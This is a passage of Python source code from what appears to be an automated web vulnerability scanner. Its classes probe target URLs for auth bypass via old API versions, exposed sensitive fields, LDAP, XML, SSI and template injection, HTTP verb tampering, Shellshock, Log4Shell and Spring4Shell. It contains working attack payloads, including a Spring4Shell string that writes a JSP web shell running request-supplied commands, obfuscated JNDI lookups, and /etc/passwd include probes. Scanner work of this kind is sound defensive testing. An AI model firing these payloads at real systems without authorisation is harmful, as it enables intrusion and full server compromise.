    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            path   = parsed.path
            base   = f"{parsed.scheme}://{parsed.netloc}"

            # Find current version in path
            ver_match = re.search(r'/(v(\d+))/', path)
            if not ver_match:
                return vulns

            current_str = ver_match.group(1)   # "v2"
            current_num = int(ver_match.group(2))  # 2

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_len    = len(baseline.text)
                baseline_status = baseline.status_code
            except Exception:
                return vulns

            for old_num in range(max(0, current_num - 3), current_num):
                old_path  = path.replace(f"/{current_str}/", f"/v{old_num}/")
                old_url   = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, old_path,
                    parsed.params, parsed.query, parsed.fragment))
                try:
                    r = await client.get(old_url, timeout=self.config.vuln_timeout,
                                         follow_redirects=True)
                    if r.status_code == 200:
                        body = r.text
                        # Check for weaker auth (no auth required vs baseline 401/403)
                        if baseline_status in (401, 403) and r.status_code == 200:
                            vulns.append(VulnerabilityResult(
                                url=old_url,
                                vulnerability_type=VulnerabilityType.API_ABUSE,
                                severity="HIGH",
                                vulnerable_params=[f"/v{old_num}/"],
                                payload_used=old_url,
                                evidence=f"Current API requires auth ({baseline_status}), v{old_num} returns 200",
                                details=f"Deprecated API version v{old_num} lacks authentication",
                                subtype=f"API Version Downgrade — v{current_num}→v{old_num}",
                                impact="Auth bypass via deprecated API version — access to unprotected endpoints",
                            ))
                            return vulns
                        # Different response size = different data / behavior
                        diff = abs(len(body) - baseline_len)
                        if diff > 200 and len(body) > 100:
                            vulns.append(VulnerabilityResult(
                                url=old_url,
                                vulnerability_type=VulnerabilityType.API_ABUSE,
                                severity="MEDIUM",
                                vulnerable_params=[f"/v{old_num}/"],
                                payload_used=old_url,
                                evidence=f"v{old_num} accessible (200 OK, Δ{diff}B vs current version)",
                                details=f"Deprecated API v{old_num} returns different data than v{current_num}",
                                subtype=f"Deprecated API Version Active — v{old_num}",
                                impact="Older API may lack security controls, rate limiting, or input validation",
                            ))
                            return vulns
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  09 — BOPLA Scanner (Broken Object Property Level Auth)
# ══════════════════════════════════════════════════════════════════


class BOPLAScanner:
    """Detects BOPLA — server accepts extra undeclared properties in JSON responses."""

    _SENSITIVE_FIELDS = [
        "password", "passwd", "password_hash", "hashed_password",
        "secret", "api_key", "private_key", "token", "auth_token",
        "credit_card", "ssn", "social_security", "bank_account",
        "internal_id", "admin_note", "internal_flag",
    ]
    _FILTER_PAYLOADS = [
        {"fields": "password,username,email"},
        {"filter": "password"},
        {"include": "password"},
        {"expand": "password"},
        {"select": "password,secret"},
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                if "application/json" not in baseline.headers.get("content-type", ""):
                    return vulns
                baseline_json = baseline.json() if baseline.status_code == 200 else {}
            except Exception:
                return vulns

            parsed = urllib.parse.urlparse(url)

            # ── Test 1: Request extra sensitive fields via query params ───────
            for fp in self._FILTER_PAYLOADS:
                try:
                    existing = dict(urllib.parse.parse_qsl(parsed.query))
                    merged   = {**existing, **fp}
                    tq  = urllib.parse.urlencode(merged)
                    tu  = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, tq, parsed.fragment))
                    r   = await client.get(tu, timeout=self.config.vuln_timeout,
                                           follow_redirects=True)
                    if r.status_code == 200:
                        try:
                            resp_data = r.json()
                            for sf in self._SENSITIVE_FIELDS:
                                val = self._find_field(resp_data, sf)
                                if val and not self._find_field(baseline_json, sf):
                                    vulns.append(VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.BOPLA,
                                        severity="HIGH",
                                        vulnerable_params=list(fp.keys()),
                                        payload_used=str(fp),
                                        evidence=f"Sensitive field '{sf}' appeared in response with filter param",
                                        details=f"Server returns '{sf}' when explicitly requested via '{list(fp.keys())[0]}'",
                                        subtype="BOPLA — Sensitive Field Exposure",
                                        impact="Attacker can extract hidden sensitive fields by requesting them explicitly",
                                    ))
                                    return vulns
                        except Exception:
                            pass
                except Exception:
                    continue

            # ── Test 2: Check if JSON response already exposes sensitive fields ──
            for sf in self._SENSITIVE_FIELDS:
                if self._find_field(baseline_json, sf):
                    vulns.append(VulnerabilityResult(
                        url=url,
                        vulnerability_type=VulnerabilityType.BOPLA,
                        severity="MEDIUM",
                        vulnerable_params=["JSON response body"],
                        payload_used="Passive — no payload required",
                        evidence=f"Sensitive field '{sf}' present in JSON response without filtering",
                        details=f"API returns '{sf}' in default response — should be filtered",
                        subtype="BOPLA — Sensitive Field in Default Response",
                        impact="Sensitive data exposed in API response without explicit request",
                    ))
                    return vulns

        except Exception:
            pass
        return vulns

    def _find_field(self, data, field_name: str):
        """Recursively search for a field name in a JSON structure."""
        if isinstance(data, dict):
            for k, v in data.items():
                if k.lower() == field_name.lower() and v:
                    return v
                found = self._find_field(v, field_name)
                if found:
                    return found
        elif isinstance(data, list):
            for item in data:
                found = self._find_field(item, field_name)
                if found:
                    return found
        return None

# ══════════════════════════════════════════════════════════════════
#  10 — LDAP Injection Scanner
# ══════════════════════════════════════════════════════════════════


class LDAPInjectionScanner:
    """Detects LDAP injection in login forms and search endpoints."""

    _PAYLOADS = [
        ("*",                          "Wildcard — dump all"),
        ("*)(uid=*))(|(uid=*",         "Filter bypass"),
        ("admin)(&(password=*",        "Auth bypass"),
        ("*)(|(cn=*",                  "OR injection"),
        (")(|(userPassword=*",         "Password dump"),
        ("admin)(|(objectclass=*",     "ObjectClass injection"),
        ("*\x00",                      "Null byte termination"),
        ("\\2a",                       "Hex encoded wildcard"),
        ("admin)(|(mail=*",            "Email dump via OR"),
    ]
    _LDAP_ERRORS = [
        r"ldap_search",   r"ldap_bind",    r"ldap_connect",
        r"ldap error",    r"invalid dn",   r"no such object",
        r"javax.naming",  r"ldapexception", r"ldap://",
        r"0x[0-9a-f]{2} ldap", r"openldap",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text   = baseline.text
                baseline_status = baseline.status_code
            except Exception:
                return vulns

            # Test in URL params
            for param in list(params.keys())[:self.config.max_params_test]:
                for payload, label in self._PAYLOADS:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text.lower()

                        for err in self._LDAP_ERRORS:
                            if re.search(err, body, re.IGNORECASE) and \
                               not re.search(err, baseline_text.lower(), re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.LDAP_INJ,
                                    severity="HIGH",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"LDAP error '{err}' triggered — absent from baseline",
                                    details=f"LDAP injection in param '{param}' — error-based detection",
                                    subtype=f"LDAP Injection — {label}",
                                    impact="Attacker can bypass LDAP auth, enumerate users, or dump directory entries",
                                ))
                                return vulns

                        # Wildcard test: if '*' gives more results than specific value
                        if payload == "*" and r.status_code == 200 and \
                           len(body) > len(baseline_text) * 1.3:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.LDAP_INJ,
                                severity="HIGH",
                                vulnerable_params=[param],
                                payload_used="*",
                                evidence=f"Wildcard returned {len(body)}B vs baseline {len(baseline_text)}B — possible LDAP dump",
                                details=f"Wildcard in '{param}' may trigger LDAP directory enumeration",
                                subtype="LDAP Injection — Wildcard Enumeration",
                                impact="Possible full LDAP directory dump via wildcard injection",
                            ))
                            return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  11 — XML Injection Scanner
# ══════════════════════════════════════════════════════════════════


class XMLInjectionScanner:
    """Detects XML injection — special chars in XML values causing malformed XML."""

    _PAYLOADS = [
        ("<test>",                         "Tag injection"),
        ("]]>",                            "CDATA termination"),
        ("&amp;",                          "Entity reference"),
        ("<![CDATA[<script>alert(1)</script>]]>", "CDATA XSS"),
        ("<?xml version=\"1.0\"?>",        "PI injection"),
        ("' or 1=1 or '",                  "Attribute injection"),
        ('<a b="',                          "Attribute break"),
        ("<!--comment-->",                 "Comment injection"),
        ("\x00",                            "Null byte"),
        ("</user><admin>true</admin><user>","Element injection"),
    ]
    _XML_ERRORS = [
        r"xml (parse|parsing) error", r"xmlparseexception", r"well-formed",
        r"entity.*not.*defined", r"invalid xml", r"unexpected token",
        r"malformed xml", r"SAXParseException", r"org\.xml\.",
        r"javax\.xml\.", r"xml syntax error",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed  = urllib.parse.urlparse(url)
            params  = urllib.parse.parse_qs(parsed.query)
            if not params:
                return vulns
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            for param in list(params.keys())[:self.config.max_params_test]:
                for payload, label in self._PAYLOADS:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text

                        for err in self._XML_ERRORS:
                            if re.search(err, body, re.IGNORECASE) and \
                               not re.search(err, baseline_text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.XML_INJ,
                                    severity="MEDIUM",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"XML error '{err}' triggered in '{param}'",
                                    details=f"Param '{param}' injected into XML without escaping",
                                    subtype=f"XML Injection — {label}",
                                    impact="May allow XML structure manipulation, XSS via CDATA, or data injection",
                                ))
                                return vulns

                        # Tag reflection check
                        if "<test>" in payload and "<test>" in body and "<test>" not in baseline_text:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.XML_INJ,
                                severity="MEDIUM",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence=f"Injected XML tag '<test>' reflected unescaped in response",
                                details=f"Input in '{param}' reflected in XML without escaping",
                                subtype="XML Injection — Unescaped Tag Reflection",
                                impact="Attacker can inject XML elements — may enable XSS or data structure manipulation",
                            ))
                            return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  12 — HTTP Verb Tampering Scanner
# ══════════════════════════════════════════════════════════════════


class VerbTamperingScanner:
    """Tests unusual HTTP verbs: TRACE, OPTIONS, DEBUG, TRACK, PATCH, CONNECT."""

    _VERBS = ["TRACE", "TRACK", "DEBUG", "OPTIONS", "CONNECT",
              "PROPFIND", "SEARCH", "ARBITRARY_VERB_Y2S"]
    _TRACE_PATTERNS = [
        r"TRACE\s+/",             # TRACE method echoed back
        r"Via:",                  # Proxy chain disclosure
        r"X-Custom-Header-y2s",   # Our custom header echoed
        r"max-forwards",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            for verb in self._VERBS:
                try:
                    hdrs = random_headers()
                    hdrs["X-Custom-Header-y2s"] = "verb-tamper-probe"
                    r = await client.request(
                        verb, url, headers=hdrs,
                        timeout=8, follow_redirects=False
                    )
                    body = r.text

                    # TRACE/TRACK: server echoes request headers → XST attack
                    if verb in ("TRACE", "TRACK"):
                        if "X-Custom-Header-y2s" in body or re.search(r"TRACE|TRACK", body[:200]):
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.VERB_TAMPER,
                                severity="MEDIUM",
                                vulnerable_params=[verb],
                                payload_used=f"{verb} {url}",
                                evidence=f"Server echoed request with {verb} method — XST possible",
                                details=f"HTTP {verb} method enabled — Cross-Site Tracing attack possible",
                                subtype=f"HTTP Verb Tampering — {verb} Enabled",
                                impact="XST can steal HttpOnly cookies by reflecting them through the browser",
                            ))
                            return vulns

                    # DEBUG: may enable .NET debugging or command execution
                    if verb == "DEBUG" and r.status_code in (200, 500):
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.VERB_TAMPER,
                            severity="HIGH",
                            vulnerable_params=["DEBUG"],
                            payload_used="DEBUG / HTTP/1.1",
                            evidence=f"DEBUG method returned HTTP {r.status_code} — may enable remote debugging",
                            details="HTTP DEBUG method accepted — potential .NET remote debugging enabled",
                            subtype="HTTP Verb Tampering — DEBUG Method",
                            impact="Can enable remote code execution via .NET remote debugging protocol",
                        ))
                        return vulns

                    # OPTIONS: check Allow header for dangerous methods
                    if verb == "OPTIONS" and "allow" in {k.lower() for k in r.headers}:
                        allow = r.headers.get("allow", r.headers.get("Allow", ""))
                        dangerous = [v for v in ["TRACE", "DEBUG", "CONNECT", "TRACK"]
                                     if v in allow.upper()]
                        if dangerous:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.VERB_TAMPER,
                                severity="MEDIUM",
                                vulnerable_params=["Allow header"],
                                payload_used="OPTIONS",
                                evidence=f"Allow: {allow} — dangerous methods listed",
                                details=f"Server allows dangerous HTTP methods: {', '.join(dangerous)}",
                                subtype=f"Dangerous HTTP Methods Enabled: {', '.join(dangerous)}",
                                impact="Enabled dangerous methods may allow cross-site tracing or debugging",
                            ))
                            return vulns

                    # Arbitrary verb accepted = misconfigured server
                    if verb == "ARBITRARY_VERB_Y2S" and r.status_code == 200:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.VERB_TAMPER,
                            severity="LOW",
                            vulnerable_params=["HTTP method"],
                            payload_used="ARBITRARY_VERB_Y2S",
                            evidence=f"Server returned 200 for completely unknown HTTP verb",
                            details="Server accepts arbitrary HTTP methods without validation",
                            subtype="HTTP Verb Tampering — Arbitrary Method Accepted",
                            impact="May bypass security controls that filter by HTTP method",
                        ))
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  13 — Shellshock Scanner (CVE-2014-6271)
# ══════════════════════════════════════════════════════════════════


class ShellshockScanner:
    """Tests for Shellshock — bash function definition in environment variables via headers."""

    _MARKER = f"shellshock_y2s_{uuid.uuid4().hex[:8]}"
    _PAYLOADS = [
        f"() {{ :; }}; echo Content-Type: text/plain; echo; echo {_MARKER}",
        f"() {{ :; }}; echo; echo {_MARKER}",
        f"() {{ ignored; }}; echo {_MARKER}",
        f"() {{ :; }}; /bin/bash -c 'echo {_MARKER}'",
    ]
    _INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "Cookie", "Accept-Encoding",
        "Accept-Language", "X-Forwarded-For", "Host",
    ]
    _CGI_PATHS = ["/cgi-bin/", "/cgi-bin/test.cgi", "/cgi-bin/bash",
                  "/cgi-bin/index.cgi", "/cgi-bin/printenv"]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            urls_to_test = [url] + [base + p for p in self._CGI_PATHS]

            for target in urls_to_test:
                for header in self._INJECTABLE_HEADERS:
                    for payload in self._PAYLOADS:
                        try:
                            hdrs = random_headers()
                            hdrs[header] = payload
                            r    = await client.get(target, headers=hdrs, timeout=8,
                                                    follow_redirects=True)
                            if self._MARKER in r.text:
                                vulns.append(VulnerabilityResult(
                                    url=target,
                                    vulnerability_type=VulnerabilityType.SHELLSHOCK,
                                    severity="CRITICAL",
                                    vulnerable_params=[header],
                                    payload_used=payload,
                                    evidence=f"Shellshock marker '{self._MARKER}' appeared in response via '{header}' header",
                                    details=f"Bash Shellshock vulnerability — '{header}' header executed as shell function",
                                    subtype=f"Shellshock via {header} Header",
                                    impact="Unauthenticated Remote Code Execution — full server compromise",
                                ))
                                return vulns
                        except Exception:
                            continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  14 — Log4Shell Scanner (CVE-2021-44228)
# ══════════════════════════════════════════════════════════════════


class Log4ShellScanner:
    """Tests for Log4Shell — JNDI lookup via LDAP/DNS in logged headers."""

    # We use a canary domain pattern — in real use, replace with actual OAST domain
    _CANARY = f"y2s-{uuid.uuid4().hex[:8]}.log4shell-probe.invalid"

    _PAYLOADS = [
        f"${{jndi:ldap://{_CANARY}/a}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{_CANARY}/a}}",  # obfuscated
        f"${{jndi:dns://{_CANARY}}}",
        f"${{jndi:rmi://{_CANARY}/a}}",
        f"${{${{lower:j}}ndi:ldap://{_CANARY}/a}}",
        f"${{${{upper:j}}ndi:ldap://{_CANARY}/a}}",
        f"%24%7Bjndi:ldap://{_CANARY}/a%7D",  # URL encoded
        f"${{jndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{_CANARY}/a}}",
    ]
    _INJECTABLE_HEADERS = [
        "User-Agent", "X-Forwarded-For", "X-Api-Version",
        "Accept", "Referer", "X-Real-IP", "Authorization",
        "X-Request-ID", "X-Correlation-ID", "X-Forwarded-Host",
        "Content-Type",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            for header in self._INJECTABLE_HEADERS:
                for payload in self._PAYLOADS[:3]:  # Limit to 3 payloads per header
                    try:
                        hdrs = random_headers()
                        hdrs[header] = payload
                        r    = await client.get(url, headers=hdrs,
                                                timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        # Look for error messages that suggest JNDI processing
                        body = r.text
                        _jndi_errors = [
                            r"jndi",r"ldap.*connect",r"javax\.naming",
                            r"com\.sun\.jndi",r"NamingException",
                            r"connect to.*ldap",
                        ]
                        for err in _jndi_errors:
                            if re.search(err, body, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.LOG4SHELL,
                                    severity="CRITICAL",
                                    vulnerable_params=[header],
                                    payload_used=payload,
                                    evidence=f"JNDI-related error '{err}' in response — Log4Shell indicator",
                                    details=f"Log4Shell probe via '{header}' triggered JNDI error",
                                    subtype=f"Log4Shell — {header}",
                                    impact="CVE-2021-44228 — Unauthenticated RCE via Log4j JNDI injection",
                                ))
                                return vulns

                        # If server crashes or returns 500 specifically on JNDI payload
                        if r.status_code == 500:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.LOG4SHELL,
                                severity="HIGH",
                                vulnerable_params=[header],
                                payload_used=payload,
                                evidence=f"HTTP 500 triggered by JNDI payload in '{header}' — possible Log4Shell",
                                details=f"Log4j may be attempting DNS/LDAP lookup — check OOB for DNS callback to {self._CANARY}",
                                subtype=f"Potential Log4Shell — {header} (verify OOB)",
                                impact="CVE-2021-44228 — OOB callback may confirm Log4Shell RCE",
                            ))
                            return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  15 — Spring4Shell Scanner (CVE-2022-22965)
# ══════════════════════════════════════════════════════════════════


class Spring4ShellScanner:
    """Tests for Spring4Shell — class.module.classLoader RCE via data binding."""

    _PAYLOADS = [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%3E&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=y2s_shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        "class.module.classLoader.DefaultAssertionStatus=true",
        "class.classLoader.resources.context.parent.pipeline.first.pattern=y2s_test",
        "class[module][classLoader][resources][context][parent][pipeline][first][pattern]=y2s_test",
    ]
    _INDICATORS = [
        r"class\.module\.classLoader",
        r"java\.lang\.ClassLoader",
        r"spring.*classLoader",
        r"tomcat.*catalina",
        r"InvocationTargetException",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text   = baseline.text
                baseline_status = baseline.status_code
            except Exception:
                return vulns

            for payload in self._PAYLOADS:
                try:
                    hdrs = random_headers()
                    hdrs["Content-Type"] = "application/x-www-form-urlencoded"
                    r = await client.post(url, content=payload.encode(),
                                          headers=hdrs, timeout=self.config.vuln_timeout,
                                          follow_redirects=True)
                    body = r.text

                    for ind in self._INDICATORS:
                        if re.search(ind, body, re.IGNORECASE) and \
                           not re.search(ind, baseline_text, re.IGNORECASE):
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SPRING4SHELL,
                                severity="CRITICAL",
                                vulnerable_params=["POST body — class.module.classLoader"],
                                payload_used=payload[:100] + "...",
                                evidence=f"Spring4Shell indicator '{ind}' triggered in response",
                                details="Spring Framework data binding processes class.module.classLoader chain",
                                subtype="Spring4Shell — CVE-2022-22965",
                                impact="Unauthenticated RCE on Java Spring applications — full server compromise",
                            ))
                            return vulns

                    # 400 on first payload but not baseline = server processing it
                    if r.status_code == 400 and baseline_status not in (400, 405):
                        body_lower = body.lower()
                        if any(w in body_lower for w in
                               ["classloader", "class.module", "spring", "binding"]):
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SPRING4SHELL,
                                severity="HIGH",
                                vulnerable_params=["class.module.classLoader"],
                                payload_used=payload[:80] + "...",
                                evidence=f"HTTP 400 with Spring-related message — server may be processing classLoader chain",
                                details="Possible Spring4Shell — server rejected payload but shows Spring processing",
                                subtype="Potential Spring4Shell — CVE-2022-22965",
                                impact="If confirmed, allows full RCE on Spring MVC applications",
                            ))
                            return vulns
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  16 — SSI Injection Scanner
# ══════════════════════════════════════════════════════════════════


class SSIScanner:
    """Detects Server-Side Include injection in parameters and form fields."""

    _MARKER     = f"ssi_y2s_{uuid.uuid4().hex[:8]}"
    _PAYLOADS   = [
        (f'<!--#echo var="DATE_LOCAL" -->',    "Date echo"),
        (f'<!--#exec cmd="echo {_MARKER}" -->',"Exec echo"),
        (f'<!--#include virtual="/etc/passwd" -->', "File include"),
        (f'<!--#printenv -->',                  "Env printenv"),
        (f'<!--#set var="y2s" value="{_MARKER}" --><!--#echo var="y2s" -->', "Variable set+echo"),
        (f'<#include "/etc/passwd">',           "FreeMarker include"),
        (f'{{% include "/etc/passwd" %}}',      "Jinja include"),
    ]
    _SSI_SIGNATURES = [
        r"\d{2}:\d{2}:\d{2}",   # time output from DATE_LOCAL
        r"root:x:0:0:",           # /etc/passwd
        r"HOME=/",                # printenv HOME
        r"DOCUMENT_ROOT",         # printenv DOCUMENT_ROOT
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                return vulns
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            for param in list(params.keys())[:self.config.max_params_test]:
                for payload, label in self._PAYLOADS:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text

                        # Check for SSI execution marker
                        if self._MARKER in body and self._MARKER not in baseline_text:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SSI,
                                severity="CRITICAL",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence=f"SSI marker '{self._MARKER}' executed and reflected in response",
                                details=f"SSI injection in param '{param}' — server processes includes",
                                subtype=f"SSI Injection — {label}",
                                impact="RCE via Server-Side Include execution — full file read and command execution",
                            ))
                            return vulns

                        # Check for SSI output signatures
                        for sig in self._SSI_SIGNATURES:
                            if re.search(sig, body) and not re.search(sig, baseline_text):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.SSI,
                                    severity="HIGH",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"SSI output signature '{sig}' appeared after injection",
                                    details=f"Server-Side Include executed — output from '{label}'",
                                    subtype=f"SSI Injection — {label}",
                                    impact="Server executes SSI directives — file read and command injection possible",
                                ))
                                return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  17 — CSTI Scanner (Client-Side Template Injection)
# ══════════════════════════════════════════════════════════════════


class CSTIScanner:
    """Detects Client-Side Template Injection in Angular, Vue, React, Ember apps."""

    _PROBES = [
        # (payload, expected_in_response, framework)
        ("{{constructor.constructor('alert(1)')()}}", None,   "Angular 1.x"),
        ("{{7*7}}",                                    "49",   "Angular/Vue (may eval)"),
        ("${7*7}",                                     "49",   "ES6 template (SSR leak)"),
        ("ng-app",                                     None,   "Angular directive probe"),
        ("[[7*7]]",                                    "49",   "Thymeleaf client"),
        ("v-bind:href=\"'javascript:alert(1)'\"",      None,   "Vue directive"),
        ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
                                                       "uid=", "Twig client"),
        ('"><img src=x onerror="alert(document.domain)">{{7*7}}', None, "Angular + XSS"),
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                return vulns
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            # Detect framework from baseline
            fw_hints = []
            bl = baseline_text.lower()
            if "ng-" in bl or "angular" in bl:                  fw_hints.append("Angular")
            if "v-bind" in bl or "vue" in bl:                   fw_hints.append("Vue")
            if "react" in bl or "__react" in bl:                 fw_hints.append("React")
            if "ember" in bl:                                    fw_hints.append("Ember")
            if "handlebars" in bl:                               fw_hints.append("Handlebars")

            for param in list(params.keys())[:self.config.max_params_test]:
                for payload, expected, framework in self._PROBES:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text

                        # Numeric evaluation
                        if expected == "49" and "49" in body and "49" not in baseline_text \
                           and "{{7*7}}" not in body:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CSTI,
                                severity="HIGH",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence=f"CSTI — '{payload}' evaluated to '49' in '{param}'",
                                details=f"Client-side template injection in '{param}' — framework: {framework}",
                                subtype=f"CSTI — {framework}",
                                impact="XSS via template execution — may lead to account takeover",
                            ))
                            return vulns

                        # RCE output (uid=)
                        if expected == "uid=" and "uid=" in body and "uid=" not in baseline_text:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CSTI,
                                severity="CRITICAL",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence=f"CSTI RCE — 'uid=' in response from '{framework}' payload",
                                details=f"Template injection escalated to RCE — {framework}",
                                subtype=f"CSTI RCE — {framework}",
                                impact="Full server-side code execution via client-side template injection",
                            ))
                            return vulns

                        # Raw payload reflected (Angular sandbox escape attempt)
                        if "constructor" in payload and payload[:20] in body \
                           and payload[:20] not in baseline_text:
                            if fw_hints:
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.CSTI,
                                    severity="MEDIUM",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"Angular-related payload reflected on {', '.join(fw_hints)} app",
                                    details=f"Possible CSTI in '{param}' on detected framework: {', '.join(fw_hints)}",
                                    subtype=f"Potential CSTI — {framework}",
                                    impact="May allow XSS via Angular expression or sandbox escape",
                                ))
                                return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns
